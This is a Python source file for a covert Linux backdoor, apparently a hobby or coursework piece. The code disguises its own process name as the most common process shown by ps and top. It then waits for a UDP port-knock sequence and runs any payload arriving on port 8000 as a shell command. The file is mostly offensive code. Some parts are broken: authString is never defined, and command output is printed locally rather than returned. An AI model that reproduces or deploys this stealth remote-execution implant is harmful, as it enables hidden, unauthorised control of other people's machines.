#!/usr/bin/python

import logging, setproctitle, triplesec
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from ctypes import cdll, byref, create_string_buffer

state = 0
ports = [1000, 2000, 3000]
password = 'dumb'
# unauthClients = {}
# authedClients = {}

# def encrypt(data):
#     cipherText = triplesec.encrypt(b"string", b'* password *')
#     return cipherText

# def decrypt(data):
#     plainText = triplesec.decrypt(data, b'* password *').decode()
#     return plainText

def setProcessName(name):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name) + 1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

def maskProcess():
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    #print "Most common process for ps/htop: {0}".format(commandResult)
    setproctitle.setproctitle(commandResult)
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    setProcessName(commandResult)
    #print "Most common process for top: {0}".format(commandResult)

def knock(packet):
    global state
    global ports
    global unauthClients
    if IP in packet:
        if UDP in packet:
            ip = packet[IP].src
            if packet[UDP].sport == 1000 and state == 0:
                state = 1
                print packet[IP].src + " state 1"
            elif packet[UDP].sport == 2000 and state == 1:
                state = 2
                print packet[IP].src + " state 2"
            elif packet[UDP].sport == 3000 and state == 2:
                state = 3
                print packet[IP].src + " state 3"
            else:
                print "You suck, state = 0"

def runCommand(packet):
    if packet.haslayer(IP) and packet.haslayer(Raw):
        print packet.show
        data = packet['Raw'].load
        if data.startswith(authString):
            data = data[len(authString):]
            print "Running command " + data
            output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = authString + output.stdout.read() + output.stderr.read()
            print output

def main():
    while state is not 3:
        sniff(filter='udp', prn=knock, count=1)
    print "test"
    sniff("dst port 8000", prn=runCommand)

if __name__ == '__main__':
    main()
